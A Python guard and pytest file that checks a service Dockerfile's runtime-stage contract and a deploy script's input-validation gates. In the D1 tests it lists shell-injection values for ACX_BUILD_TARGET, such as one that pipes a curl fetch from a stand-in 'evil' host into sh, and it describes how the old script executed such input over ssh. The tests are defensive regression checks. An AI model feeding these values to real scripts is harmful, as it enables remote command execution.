"""Image-contract guard for E15-3a-BR-07 and BR-03 build-arg follow-up.

Two guards live here:

1. BR-07 guard: the deployed acx-backend image must include `scripts/`
   so operators can run `python -m scripts.manage_api_keys` inside the
   api container per the BR-02 task plan and `.env.prod.example`.
   Originally discovered in prod when
   `docker compose exec api python -m scripts.manage_api_keys` failed
   with `ModuleNotFoundError: No module named 'scripts'`.

2. BR-03 follow-up guard: the deployed image must carry its build-time
   git SHA in the `APP_GIT_COMMIT_SHA` environment variable so the
   runtime `/health` and `/version` endpoints (api/main.py) can surface
   a non-"unknown" commit_sha for the plugin-side probe and operator
   forensics. The runtime reader lives at api/main.py line ~70
   (`os.environ.get("APP_GIT_COMMIT_SHA", "")`). The producer side is
   this Dockerfile (`ARG GIT_COMMIT_SHA` + `ENV APP_GIT_COMMIT_SHA`)
   plus the operator deploy command (`docker build --build-arg
   GIT_COMMIT_SHA=$(git rev-parse HEAD) ...`) documented in
   infra/oci/README.md. Without both halves the health-payload ships
   `commit_sha: "unknown"` and BR-03's /version surface provides no
   value to the plugin backend_too_old probe.

Stage awareness (ORCH-LAUNCH-01-S1-RA-05): BuildKit builds the *last*
named stage when ``--target`` is omitted. Package-contract claims are
scoped to the default ``runtime`` stage's *effective* body (follows
``FROM <named-stage>`` inheritance so shared layers in ``runtime-base``
still satisfy the contract), and the script fails closed when the last
stage is not ``runtime`` (so a silent flip to ``runtime-vlm`` cannot go
green).

Parser source (GATE-BR-01 / wave-3): the multi-stage Dockerfile parser
lives in ``recognition/tests/dockerfile_stages.py``. This script imports
that shared module (with a small sys.path bootstrap so it runs from the
repo root without installing the service package). Do not reintroduce a
local ``_FROM_RE`` duplicate.
"""

from __future__ import annotations

import os
import pathlib
import re
import subprocess
import sys
import textwrap

REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
DOCKERFILE = REPO_ROOT / "apps" / "prototype-description-service" / "Dockerfile"
SCRIPTS_DIR = REPO_ROOT / "apps" / "prototype-description-service" / "scripts"
OCI_README = REPO_ROOT / "infra" / "oci" / "README.md"
DEPLOY_SCRIPT = REPO_ROOT / "scripts" / "deploy" / "recognition-service.sh"
_SERVICE_ROOT = REPO_ROOT / "apps" / "prototype-description-service"
_TESTS_PARENT = _SERVICE_ROOT  # recognition is importable when service root is on path

DEFAULT_RUNTIME_STAGE = "runtime"

COPY_SCRIPTS = re.compile(r"^COPY\s+scripts/\s+scripts/\s*$", re.MULTILINE)
ARG_GIT_SHA = re.compile(r"^ARG\s+GIT_COMMIT_SHA\b", re.MULTILINE)
ENV_APP_GIT_SHA = re.compile(
    r"^ENV\s+APP_GIT_COMMIT_SHA\s*=\s*\$\{?GIT_COMMIT_SHA\}?\s*$",
    re.MULTILINE,
)
README_BUILD_ARG = re.compile(
    r"docker\s+build(?:[^\n]|\\\n)*--build-arg\s+GIT_COMMIT_SHA=",
)


def _ensure_shared_parser_importable() -> None:
    """Put the service root on sys.path so recognition.tests.dockerfile_stages imports."""
    service = str(_SERVICE_ROOT)
    if service not in sys.path:
        sys.path.insert(0, service)


_ensure_shared_parser_importable()

from recognition.tests.dockerfile_stages import (  # noqa: E402
    default_build_target,
    dockerfile_stages,
    effective_stage_body,
)


def assert_default_target_is_runtime(dockerfile: pathlib.Path = DOCKERFILE) -> None:
    stages = dockerfile_stages(dockerfile)
    assert stages, f"expected named build stages in {dockerfile}"
    last = default_build_target(dockerfile)
    assert last == DEFAULT_RUNTIME_STAGE, (
        f"last Dockerfile stage is {last!r}, so a bare `docker build` would "
        f"build it. {DEFAULT_RUNTIME_STAGE!r} must stay last or production "
        "ships the non-default (e.g. torch-bearing) image "
        "(ORCH-LAUNCH-01-S1-RA-05 / BR-01)."
    )


def assert_runtime_copies_scripts(dockerfile: pathlib.Path = DOCKERFILE) -> None:
    stages = dockerfile_stages(dockerfile)
    assert DEFAULT_RUNTIME_STAGE in stages, (
        f"Dockerfile missing {DEFAULT_RUNTIME_STAGE!r} stage; have {list(stages)}"
    )
    body = effective_stage_body(dockerfile, DEFAULT_RUNTIME_STAGE)
    assert COPY_SCRIPTS.search(body), (
        "runtime stage (effective body) must contain `COPY scripts/ scripts/` so "
        "the operator CLI (scripts/manage_api_keys.py) is reachable in the "
        "deployed image. Without it, `python -m scripts.manage_api_keys` fails "
        "with ModuleNotFoundError in production (E15-3a-BR-07). Stage-scoped + "
        "inheritance-aware: a COPY only in another non-ancestor stage does not "
        "satisfy this contract (ORCH-LAUNCH-01-S1-RA-05 / wave-2)."
    )


def assert_runtime_declares_git_commit_sha_build_arg(
    dockerfile: pathlib.Path = DOCKERFILE,
) -> None:
    body = effective_stage_body(dockerfile, DEFAULT_RUNTIME_STAGE)
    assert ARG_GIT_SHA.search(body), (
        "runtime stage (effective body) must declare `ARG GIT_COMMIT_SHA` so "
        "operators can pass --build-arg GIT_COMMIT_SHA=$(git rev-parse HEAD) at "
        "build time. Without it the runtime image cannot surface a real "
        "commit_sha via /health or /version and the BR-03 plugin probe is blind "
        "(E15-3a-BR-03 follow-up)."
    )


def assert_runtime_exports_app_git_commit_sha_env(
    dockerfile: pathlib.Path = DOCKERFILE,
) -> None:
    body = effective_stage_body(dockerfile, DEFAULT_RUNTIME_STAGE)
    assert ENV_APP_GIT_SHA.search(body), (
        "runtime stage (effective body) must contain "
        "`ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}` so api/main.py's "
        "os.environ.get('APP_GIT_COMMIT_SHA') reader returns the build-time "
        "SHA instead of falling back to 'unknown' (E15-3a-BR-03 follow-up)."
    )


def assert_manage_api_keys_module_exists() -> None:
    cli = SCRIPTS_DIR / "manage_api_keys.py"
    assert cli.is_file(), f"expected {cli} to exist"


def assert_oci_readme_passes_git_commit_sha_build_arg() -> None:
    text = OCI_README.read_text(encoding="utf-8")
    assert README_BUILD_ARG.search(text), (
        "infra/oci/README.md deploy instructions must show `docker build "
        "--build-arg GIT_COMMIT_SHA=$(git rev-parse HEAD) ...` so operators "
        "actually populate the build-time SHA. The Dockerfile ARG is inert "
        "without a matching operator-side producer (E15-3a-BR-03 follow-up)."
    )


def run_contract_checks(dockerfile: pathlib.Path = DOCKERFILE) -> None:
    """Run all image-contract assertions; raise AssertionError on failure."""
    assert_default_target_is_runtime(dockerfile)
    assert_runtime_copies_scripts(dockerfile)
    assert_manage_api_keys_module_exists()
    assert_runtime_declares_git_commit_sha_build_arg(dockerfile)
    assert_runtime_exports_app_git_commit_sha_env(dockerfile)
    assert_oci_readme_passes_git_commit_sha_build_arg()


def main(argv: list[str] | None = None) -> int:
    """CLI entrypoint: optional Dockerfile path as argv[1]. Exit 0 on pass, 1 on fail."""
    args = list(sys.argv[1:] if argv is None else argv)
    dockerfile = pathlib.Path(args[0]) if args else DOCKERFILE
    try:
        # README + manage_api_keys checks use fixed repo paths; only Dockerfile
        # assertions are path-parameterized for synthetic negative tests.
        assert_default_target_is_runtime(dockerfile)
        assert_runtime_copies_scripts(dockerfile)
        assert_runtime_declares_git_commit_sha_build_arg(dockerfile)
        assert_runtime_exports_app_git_commit_sha_env(dockerfile)
        if dockerfile.resolve() == DOCKERFILE.resolve():
            assert_manage_api_keys_module_exists()
            assert_oci_readme_passes_git_commit_sha_build_arg()
    except AssertionError as exc:
        print(f"FAIL: {exc}", file=sys.stderr)
        return 1
    print(f"OK: image contract holds for {dockerfile}")
    return 0


# ---- pytest surface (same checks; path-parameterized negatives below) ----


def test_dockerfile_default_target_is_runtime() -> None:
    assert_default_target_is_runtime()


def test_dockerfile_copies_scripts_into_runtime() -> None:
    assert_runtime_copies_scripts()


def test_manage_api_keys_module_exists_at_expected_path() -> None:
    assert_manage_api_keys_module_exists()


def test_dockerfile_declares_git_commit_sha_build_arg() -> None:
    assert_runtime_declares_git_commit_sha_build_arg()


def test_dockerfile_exports_app_git_commit_sha_env() -> None:
    assert_runtime_exports_app_git_commit_sha_env()


def test_oci_readme_deploy_command_passes_git_commit_sha_build_arg() -> None:
    assert_oci_readme_passes_git_commit_sha_build_arg()


def test_guard_bites_when_default_target_is_runtime_vlm(tmp_path: pathlib.Path) -> None:
    """RA-05 mutation (a): last stage runtime-vlm must fail the contract."""
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim AS runtime\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n"
        "\n"
        "FROM python:3.12-slim AS runtime-vlm\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n",
        encoding="utf-8",
    )
    # Whole-file patterns would still match COPY/ARG/ENV anywhere.
    whole = df.read_text(encoding="utf-8")
    assert COPY_SCRIPTS.search(whole)
    assert ARG_GIT_SHA.search(whole)
    assert ENV_APP_GIT_SHA.search(whole)

    assert main([str(df)]) != 0, (
        "contract must exit non-zero when last stage is runtime-vlm"
    )


def test_guard_bites_when_scripts_copy_only_in_non_default_stage(
    tmp_path: pathlib.Path,
) -> None:
    """RA-05: scripts COPY only in runtime-vlm must not satisfy the runtime contract."""
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim AS runtime-vlm\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n"
        "\n"
        "FROM python:3.12-slim AS runtime\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n",
        encoding="utf-8",
    )
    whole = df.read_text(encoding="utf-8")
    assert COPY_SCRIPTS.search(whole), "control: whole-file would stay green"
    assert main([str(df)]) != 0


def test_effective_body_accepts_scripts_copy_from_runtime_base(
    tmp_path: pathlib.Path,
) -> None:
    """Wave-2: COPY scripts/ in runtime-base must satisfy the runtime contract."""
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim AS runtime-base\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n"
        "\n"
        "FROM runtime-base AS runtime\n"
        "ENV ACX_IMAGE_VARIANT=recognition\n",
        encoding="utf-8",
    )
    # Own body alone would miss the COPY — effective body must pass.
    own = dockerfile_stages(df)[DEFAULT_RUNTIME_STAGE]
    assert not COPY_SCRIPTS.search(own)
    assert main([str(df)]) == 0


# ---- ORCH-LAUNCH-01 wave-4 lane B: deploy-script security (D1) ------------


def _assert_safe_shell_token_body() -> str:
    """Extract assert_safe_shell_token from the deploy script."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    m = re.search(
        r"assert_safe_shell_token\(\)\s*\{(?P<body>.*?)\n\}",
        script,
        re.DOTALL,
    )
    assert m, "assert_safe_shell_token must exist (D1 charset gate)"
    return m.group("body")


def _probe_build_target(target: str) -> subprocess.CompletedProcess[str]:
    """Run the real charset gate against ACX_BUILD_TARGET (no full deploy script)."""
    body = _assert_safe_shell_token_body()
    probe = textwrap.dedent(
        f"""\
        #!/usr/bin/env bash
        set -euo pipefail
        fail() {{ printf '%s\\n' "$*" >&2; exit 1; }}
        assert_safe_shell_token() {{
        {body}
        }}
        ACX_BUILD_TARGET={target!r}
        assert_safe_shell_token "ACX_BUILD_TARGET" "${{ACX_BUILD_TARGET}}"
        echo ACCEPTED
        """
    )
    return subprocess.run(
        ["bash", "-c", probe],
        check=False,
        capture_output=True,
        text=True,
    )


def test_d1_acx_build_target_charset_gate_exists() -> None:
    """D1 structural: charset allowlist + ingestion-time validation present."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    assert "assert_safe_shell_token" in script
    assert re.search(r"\[A-Za-z0-9_\.\-\]\+", script)
    assert "assert_safe_shell_token \"ACX_BUILD_TARGET\"" in script
    assert "assert_safe_image_repo" in script


def test_d1_rejects_metacharacter_build_target() -> None:
    """D1 / TEST-15: shell metacharacters in ACX_BUILD_TARGET must be refused.

    Proven RED against the pre-fix script (no assert_safe_shell_token; evil
    value flowed into resolve_image_repo_name → ACX_IMAGE_REPO → single-quoted
    ssh fragment in ship_remote_image_repo_env and executed on the VM).
    """
    evil_values = [
        "x';curl evil|sh;'",
        "runtime-vlm;id",
        "foo$(whoami)",
        "bar`id`",
        "baz|tee",
        "qux&bg",
        "a b",
        "a\nb",
    ]
    for target in evil_values:
        result = _probe_build_target(target)
        assert result.returncode != 0, (
            f"D1: expected refuse for metachar target {target!r}, got ACCEPTED: "
            f"stdout={result.stdout!r} stderr={result.stderr!r}"
        )
        combined = (result.stdout or "") + (result.stderr or "")
        assert "charset" in combined.lower() or "refusing" in combined.lower(), (
            f"error must name charset refusal for {target!r}: {combined}"
        )

    # Legitimate targets still accepted.
    for target in ("", "runtime", "runtime-vlm", "builder", "foo_bar.1-2"):
        result = _probe_build_target(target)
        assert result.returncode == 0, (
            f"legitimate target {target!r} must pass: {result.stderr}"
        )
        assert "ACCEPTED" in (result.stdout or "")


def test_d1_full_script_refuses_evil_build_target_at_ingestion() -> None:
    """Sourcing/executing the deploy script with an evil ACX_BUILD_TARGET exits."""
    evil = "x';curl evil|sh;'"
    env = os.environ.copy()
    env["ACX_BUILD_TARGET"] = evil
    proc = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode != 0, (
        f"deploy script must refuse evil ACX_BUILD_TARGET at ingestion; "
        f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    )
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert "charset" in combined.lower() or "refusing" in combined.lower()


def test_d8_variant_vlm_without_vlm_target_fails_closed() -> None:
    """D8 build-half: ACX_IMAGE_VARIANT=vlm + non-*vlm* target is refused."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    assert "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm*" in script
    env = os.environ.copy()
    env["ACX_IMAGE_VARIANT"] = "vlm"
    env["ACX_BUILD_TARGET"] = "runtime"
    proc = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode != 0
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert "ACX_IMAGE_VARIANT=vlm" in combined


def test_d4_boot_smoke_uses_real_entrypoint_and_cache_mount() -> None:
    """D4: Gate 2 must run image CMD (not uvicorn override) with /data/cache mount."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    # Tag promotion after smoke remains required.
    deploy_body = script.split("do_deploy()", 1)[1].split("do_promote()", 1)[0]
    assert deploy_body.index("do_push_sha") < deploy_body.index("promote_gate") < deploy_body.index(
        "do_push_tag"
    )
    smoke = script.split("do_boot_smoke()", 1)[1].split("\ndo_restart()", 1)[0]
    assert "--entrypoint sh" not in smoke or "uvicorn api.main:app" not in smoke
    assert "/data/cache:ro" in smoke
    assert "RECOGNITION_BLOB_ROOT" in smoke
    assert "ACX_MODELS_PATH" in smoke


def test_d6_ship_remote_uses_sudo_and_trailing_newline() -> None:
    """D6: ship_remote_image_repo_env must sudo and guard trailing newline."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    m = re.search(
        r"ship_remote_image_repo_env\(\)\s*\{(?P<body>.*?)\n\}",
        script,
        re.DOTALL,
    )
    assert m, "ship_remote_image_repo_env missing"
    body = m.group("body")
    assert "sudo" in body
    assert "tail -c1" in body or "trailing" in body.lower() or "tee -a" in body
    # Ship before tag promotion (in promote_gate).
    gate = script.split("promote_gate()", 1)[1].split("\nenv_to_compose_files", 1)[0]
    assert "ship_remote_image_repo_env" in gate
    assert gate.index("do_boot_smoke") < gate.index("ship_remote_image_repo_env")


def test_d9_clear_image_repo_subcommand_documented() -> None:
    """D9: sticky ACX_IMAGE_REPO removal path exists and is documented."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    assert "clear-image-repo" in script
    assert "clear_remote_image_repo_env" in script
    assert "Sticky ACX_IMAGE_REPO" in script or "clear-image-repo" in script.split(
        "Image variants", 1
    )[1][:2000]


def test_d10_verify_returns_not_exits_on_image_mismatch() -> None:
    """D10: verify_running_image_matches_deployed must return 1, not fail/exit."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    m = re.search(
        r"verify_running_image_matches_deployed\(\)\s*\{(?P<body>.*?)\n\}",
        script,
        re.DOTALL,
    )
    assert m, "verify_running_image_matches_deployed missing"
    body = m.group("body")
    assert "return 1" in body
    # fail() would defeat ACX_VERIFY_OPTIONAL when used under `if ! do_verify`.
    assert not re.search(r"^\s*fail\s+", body, re.MULTILINE), (
        "verify_running_image_matches_deployed must not call fail() (exits the shell)"
    )
    assert "read_remote_image_repo" in script
    assert "if ! verify_running_image_matches_deployed" in script


if __name__ == "__main__":
    raise SystemExit(main())
